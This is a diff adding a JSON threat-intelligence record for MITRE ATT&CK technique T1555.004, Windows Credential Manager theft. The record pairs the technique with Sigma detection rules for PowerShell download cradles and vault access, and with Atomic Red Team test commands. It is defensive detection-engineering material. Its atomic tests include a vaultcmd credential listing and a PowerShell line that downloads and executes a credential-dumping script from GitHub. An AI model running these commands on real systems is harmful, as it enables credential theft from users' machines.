@@ -1,0 +1,169 @@
+{
+    "id": "T1555.004",
+    "name": "Windows Credential Manager",
+    "description": "Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker)\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](T1555.003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\nCredential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%Users\\[Username]AppDataLocalMicrosoft\\[Vault/Credentials]`. The encryption key can be found in a file named `Policy.vpol`, typically located in the same folder as the credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes The Windows Vault)\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. `vaultcmd.exe` is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may gather credentials by reading files located inside of the Credential Lockers. Adversaries may also abuse Windows APIs such as `CredEnumerateA` to list credentials managed by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)\nAdversaries may use password recovery tools to obtain plain text passwords from the Credential Manager.(Citation: Malwarebytes The Windows Vault)",
+    "platforms": "Windows",
+    "kill_chain_phases": "Credential Access",
+    "data_sources": "Process: Process Creation, Command: Command Execution, Process: OS API Execution, File: File Access",
+    "detection": "Monitor process and command-line parameters of `vaultcmd.exe` for suspicious activity, such as listing credentials from the Windows Credentials locker (i.e., `vaultcmd /listcreds:“Windows Credentials”`).(Citation: Malwarebytes The Windows Vault)\nConsider monitoring API calls such as `CredEnumerateA` that may list credentials from the Windows Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)\nConsider monitoring file reads to Vault locations, `%Systemdrive%Users\\[Username]AppDataLocalMicrosoft\\[Vault/Credentials]`, for suspicious activity.(Citation: Malwarebytes The Windows Vault)",
+    "url": "https://attack.mitre.org/techniques/T1555/004",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1555.004",
+                "atomic_attack_guid": "fa714db1-63dd-479e-a58e-7b2b52ca5997",
+                "atomic_attack_name": "WinPwn - Loot local Credentials - Invoke-WCMDump",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "PowerShell Download and Execution Cradles",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml",
+                        "remote_content": "title: PowerShell Download and Execution Cradles\nid: 85b0b087-eddf-4a2b-b033-d771fa2b9775\nstatus: test\ndescription: Detects PowerShell download and execution cradles.\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-05-04\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_download:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    selection_iex:\n        CommandLine|contains:\n            - ';iex $'\n            - '| IEX'\n            - '|IEX '\n            - 'I`E`X'\n            - 'I`EX'\n            - 'IE`X'\n            - 'iex '\n            - 'IEX ('\n            - 'IEX('\n            - 'Invoke-Expression'\n    condition: all of selection_*\nfalsepositives:\n    - Some PowerShell installers were seen using similar combinations. Apply filters accordingly\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Suspicious PowerShell Invocations - Specific - ProcessCreation",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_invocation_specific.yml",
+                        "remote_content": "title: Suspicious PowerShell Invocations - Specific - ProcessCreation\nid: 536e2947-3729-478c-9903-745aaffe60d2\nrelated:\n    - id: fce5f582-cc00-41e1-941a-c6fabf0fdb8c\n      type: obsolete\n    - id: ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71\n      type: similar\n    - id: 8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090\n      type: similar\nstatus: test\ndescription: Detects suspicious PowerShell invocation command parameters\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-05\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_convert_b64:\n        CommandLine|contains|all:\n            - '-nop'\n            - ' -w '\n            - 'hidden'\n            - ' -c '\n            - '[Convert]::FromBase64String'\n    selection_iex:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-noni'\n            - '-nop'\n            - ' -c '\n            - 'iex'\n            - 'New-Object'\n    selection_enc:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-ep'\n            - 'bypass'\n            - '-Enc'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'reg'\n            - 'add'\n            - '\\software\\'\n    selection_webclient:\n        CommandLine|contains|all:\n            - 'bypass'\n            - '-noprofile'\n            - '-windowstyle'\n            - 'hidden'\n            - 'new-object'\n            - 'system.net.webclient'\n            - '.download'\n    selection_iex_webclient:\n        CommandLine|contains|all:\n            - 'iex'\n            - 'New-Object'\n            - 'Net.WebClient'\n            - '.Download'\n    filter_chocolatey:\n        CommandLine|contains:\n            - \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\"\n            - 'Write-ChocolateyWarning'\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Suspicious PowerShell Download and Execute Pattern",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_susp_download_patterns.yml",
+                        "remote_content": "title: Suspicious PowerShell Download and Execute Pattern\nid: e6c54d94-498c-4562-a37c-b469d8e9a275\nrelated:\n    - id: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\n      type: derived\nstatus: test\ndescription: Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)\nreferences:\n    - https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70\n    - https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-28\nmodified: 2022-03-01\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: # make sure that your backend applies the strings case-insensitive\n            - 'IEX ((New-Object Net.WebClient).DownloadString'\n            - 'IEX (New-Object Net.WebClient).DownloadString'\n            - 'IEX((New-Object Net.WebClient).DownloadString'\n            - 'IEX(New-Object Net.WebClient).DownloadString'\n            - ' -command (New-Object System.Net.WebClient).DownloadFile('\n            - ' -c (New-Object System.Net.WebClient).DownloadFile('\n    condition: selection\nfalsepositives:\n    - Software installers that pull packages from remote systems and execute them\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Web Download",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
+                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Download Pattern",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml",
+                        "remote_content": "title: PowerShell Download Pattern\nid: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\nrelated:\n    - id: e6c54d94-498c-4562-a37c-b469d8e9a275\n      type: derived\nstatus: test\ndescription: Detects a Powershell process that contains download commands in its command line string\nreferences:\n    - https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html\n    - https://lab52.io/blog/winter-vivern-all-summer/\n    - https://hatching.io/blog/powershell-analysis/\nauthor: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro\ndate: 2019-01-16\nmodified: 2023-01-26\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'new-object'\n            - 'net.webclient).'\n            - 'download'\n        CommandLine|contains:\n            - 'string('\n            - 'file('\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
+                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Any Powershell DownloadString",
+                        "rule_link": "https://research.splunk.com/endpoint/4d015ef2-7adf-11eb-95da-acde48001122/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1555.004",
+                "atomic_attack_guid": "9c2dd36d-5c8b-4b29-8d72-a11b0d5d7439",
+                "atomic_attack_name": "Access Saved Credentials via VaultCmd",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Windows Credential Manager Access via VaultCmd",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_vaultcmd_list_creds.yml",
+                        "remote_content": "title: Windows Credential Manager Access via VaultCmd\nid: 58f50261-c53b-4c88-bd12-1d71f12eda4c\nstatus: test\ndescription: List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1555.004/T1555.004.md#atomic-test-1---access-saved-credentials-via-vaultcmd\nauthor: frack113\ndate: 2022-04-08\nmodified: 2022-05-13\ntags:\n    - attack.credential-access\n    - attack.t1555.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VaultCmd.exe'\n        - OriginalFileName: 'VAULTCMD.EXE'\n    selection_cli:\n        CommandLine|contains: '/listcreds:'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "46612ae6-86be-4802-bc07-39b59feb1309",
+                    "58f50261-c53b-4c88-bd12-1d71f12eda4c",
+                    "7a2a22ea-a203-4cd3-9abf-20eb1c5c6cd2",
+                    "d336b553-5da9-46ca-98a8-0b23f49fb447",
+                    "a4694263-59a8-4608-a3a0-6f8d3a51664c"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "46612ae6-86be-4802-bc07-39b59feb1309",
+                        "lookup_data": {
+                            "description": "Detects suspicious processes based on name and location that access the Windows Data Protection API Master keys.\nWhich can be a sign of credential stealing. Example case would be usage of mimikatz \"dpapi::masterkey\" function\n",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/10/17\ndescription: 'Detects suspicious processes based on name and location that access\n  the Windows Data Protection API Master keys.\n\n  Which can be a sign of credential stealing. Example case would be usage of mimikatz\n  \"dpapi::masterkey\" function\n\n  '\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_system_folders:\n    Image|startswith:\n    - C:\\Program Files\\\n    - C:\\Program Files (x86)\\\n    - C:\\Windows\\system32\\\n    - C:\\Windows\\SysWOW64\\\n  selection:\n    FileName|contains:\n    - \\Microsoft\\Protect\\S-1-5-18\\\n    - \\Microsoft\\Protect\\S-1-5-21-\nfalsepositives:\n- Unknown\nid: 46612ae6-86be-4802-bc07-39b59feb1309\nlevel: medium\nlogsource:\n  category: file_access\n  definition: file_access rules are using the Microsoft-Windows-Kernel-File ETW provider\n  product: windows\nreferences:\n- https://web.archive.org/web/20181130065817/http://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/\n- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1555.004\ntitle: Suspicious Access To Windows DPAPI Master Keys\n",
+                            "sigma:id": "46612ae6-86be-4802-bc07-39b59feb1309",
+                            "title": "Suspicious Access To Windows DPAPI Master Keys",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "58f50261-c53b-4c88-bd12-1d71f12eda4c",
+                        "lookup_data": {
+                            "description": "List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe",
+                            "raw": "author: frack113\ndate: 2022/04/08\ndescription: List credentials currently stored in Windows Credential Manager via the\n  native Windows utility vaultcmd.exe\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains: '/listcreds:'\n  selection_img:\n  - Image|endswith: \\VaultCmd.exe\n  - OriginalFileName: VAULTCMD.EXE\nfalsepositives:\n- Unknown\nid: 58f50261-c53b-4c88-bd12-1d71f12eda4c\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/05/13\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1555.004/T1555.004.md#atomic-test-1---access-saved-credentials-via-vaultcmd\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1555.004\ntitle: Windows Credential Manager Access via VaultCmd\n",
+                            "sigma:id": "58f50261-c53b-4c88-bd12-1d71f12eda4c",
+                            "title": "Windows Credential Manager Access via VaultCmd",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "7a2a22ea-a203-4cd3-9abf-20eb1c5c6cd2",
+                        "lookup_data": {
+                            "description": "Detects suspicious processes based on name and location that access the Windows Credential History File.\nWhich can be a sign of credential stealing. Example case would be usage of mimikatz \"dpapi::credhist\" function\n",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/10/17\ndescription: 'Detects suspicious processes based on name and location that access\n  the Windows Credential History File.\n\n  Which can be a sign of credential stealing. Example case would be usage of mimikatz\n  \"dpapi::credhist\" function\n\n  '\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_processes:\n    Image: C:\\Windows\\explorer.exe\n  filter_system_folders:\n    Image|startswith:\n    - C:\\Program Files\\\n    - C:\\Program Files (x86)\\\n    - C:\\Windows\\system32\\\n    - C:\\Windows\\SysWOW64\\\n  selection:\n    FileName|endswith: \\Microsoft\\Protect\\CREDHIST\nfalsepositives:\n- Unknown\nid: 7a2a22ea-a203-4cd3-9abf-20eb1c5c6cd2\nlevel: medium\nlogsource:\n  category: file_access\n  definition: file_access rules are using the Microsoft-Windows-Kernel-File ETW provider\n  product: windows\nreferences:\n- https://tools.thehacker.recipes/mimikatz/modules/dpapi/credhist\n- https://www.passcape.com/windows_password_recovery_dpapi_credhist\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1555.004\ntitle: Suspicious Access To Windows Credential History File\n",
+                            "sigma:id": "7a2a22ea-a203-4cd3-9abf-20eb1c5c6cd2",
+                            "title": "Suspicious Access To Windows Credential History File",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "d336b553-5da9-46ca-98a8-0b23f49fb447",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1555.004",
+                            "mitre-cti:description": "Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker)\n\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\n\nCredential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes The Windows Vault)\n\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)\n\nAdversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the “Back up...” button on the “Stored User Names and Passwords” GUI.\n\nPassword recovery tools may also obtain plain text passwords from the Credential Manager.(Citation: Malwarebytes The Windows Vault)",
+                            "mitre-cti:name": "Windows Credential Manager",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'modified': '2022-10-21T15:46:55.929Z', 'name': 'Windows Credential Manager', 'description': 'Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker)\\n\\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\\n\\nCredential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\\\\Users\\\\\\\\[Username]\\\\AppData\\\\Local\\\\Microsoft\\\\\\\\[Vault/Credentials]\\\\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes The Windows Vault)\\n\\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)\\n\\nAdversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the “Back up...” button on the “Stored User Names and Passwords” GUI.\\n\\nPassword recovery tools may also obtain plain text passwords from the Credential Manager.(Citation: Malwarebytes The Windows Vault)', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}], 'x_mitre_detection': 'Monitor process and command-line parameters of <code>vaultcmd.exe</code> for suspicious activity, such as listing credentials from the Windows Credentials locker (i.e., <code>vaultcmd /listcreds:“Windows Credentials”</code>).(Citation: Malwarebytes The Windows Vault)\\n\\nConsider monitoring API calls such as <code>CredEnumerateA</code> that may list credentials from the Windows Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)\\n\\nConsider monitoring file reads to Vault locations, <code>%Systemdrive%\\\\Users\\\\\\\\[Username]\\\\AppData\\\\Local\\\\Microsoft\\\\\\\\[Vault/Credentials]\\\\</code>, for suspicious activity.(Citation: Malwarebytes The Windows Vault)', 'x_mitre_platforms': ['Windows'], 'x_mitre_is_subtechnique': True, 'x_mitre_deprecated': False, 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_version': '1.1', 'x_mitre_contributors': ['Bernaldo Penas Antelo', 'Mugdha Peter Bansode', 'Uriel Kosayev', 'Vadim Khrykov'], 'x_mitre_data_sources': ['File: File Access', 'Process: OS API Execution', 'Process: Process Creation', 'Command: Command Execution'], 'type': 'attack-pattern', 'id': 'attack-pattern--d336b553-5da9-46ca-98a8-0b23f49fb447', 'created': '2020-11-23T15:35:53.793Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'revoked': False, 'external_references': [{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/techniques/T1555/004', 'external_id': 'T1555.004'}, {'source_name': 'Malwarebytes The Windows Vault', 'description': 'Arntz, P. (2016, March 30). The Windows Vault . Retrieved November 23, 2020.', 'url': 'https://blog.malwarebytes.com/101/2016/01/the-windows-vaults/'}, {'source_name': 'Delpy Mimikatz Crendential Manager', 'description': 'Delpy, B. (2017, December 12). howto ~ credential manager saved credentials. Retrieved November 23, 2020.', 'url': 'https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials'}, {'source_name': 'Microsoft Credential Locker', 'description': 'Microsoft. (2013, October 23). Credential Locker Overview. Retrieved November 24, 2020.', 'url': 'https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-8.1-and-8/jj554668(v=ws.11)?redirectedfrom=MSDN'}, {'source_name': 'Microsoft Credential Manager store', 'description': 'Microsoft. (2016, August 31). Cached and Stored Credentials Technical Overview. Retrieved November 24, 2020.', 'url': 'https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v=ws.11)#credential-manager-store'}, {'source_name': 'Microsoft CredEnumerate', 'description': 'Microsoft. (2018, December 5). CredEnumarateA function (wincred.h). Retrieved November 24, 2020.', 'url': 'https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credenumeratea'}, {'source_name': 'passcape Windows Vault', 'description': 'Passcape. (n.d.). Windows Password Recovery - Vault Explorer and Decoder. Retrieved November 24, 2020.', 'url': 'https://www.passcape.com/windows_password_recovery_vault_explorer'}], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "a4694263-59a8-4608-a3a0-6f8d3a51664c",
+                        "lookup_data": {
+                            "description": "Detects the invocation of the Stored User Names and Passwords dialogue (Key Manager)",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/04/21\ndescription: Detects the invocation of the Stored User Names and Passwords dialogue\n  (Key Manager)\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - keymgr\n    - KRShowKeyMgr\n    Image|endswith: \\rundll32.exe\nfalsepositives:\n- Administrative activity\nid: a4694263-59a8-4608-a3a0-6f8d3a51664c\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/NinjaParanoid/status/1516442028963659777\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1555.004\ntitle: Suspicious Key Manager Access\n",
+                            "sigma:id": "a4694263-59a8-4608-a3a0-6f8d3a51664c",
+                            "title": "Suspicious Key Manager Access",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1555.004",
+                "display_name": "Credentials from Password Stores: Windows Credential Manager",
+                "atomic_tests": [
+                    {
+                        "name": "Access Saved Credentials via VaultCmd",
+                        "auto_generated_guid": "9c2dd36d-5c8b-4b29-8d72-a11b0d5d7439",
+                        "description": "List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe\nCredential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos\nhttps://blog.malwarebytes.com/101/2016/01/the-windows-vaults/\nhttps://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "name": "command_prompt",
+                            "elevation_required": false,
+                            "command": "vaultcmd /listcreds:\"Windows Credentials\"\n"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - Loot local Credentials - Invoke-WCMDump",
+                        "auto_generated_guid": "fa714db1-63dd-479e-a58e-7b2b52ca5997",
+                        "description": "Loot local Credentials - Invoke-WCMDump technique via function of WinPwn",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')\nInvoke-WCMDump",
+                            "name": "powershell"
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 16:17:07"
+}
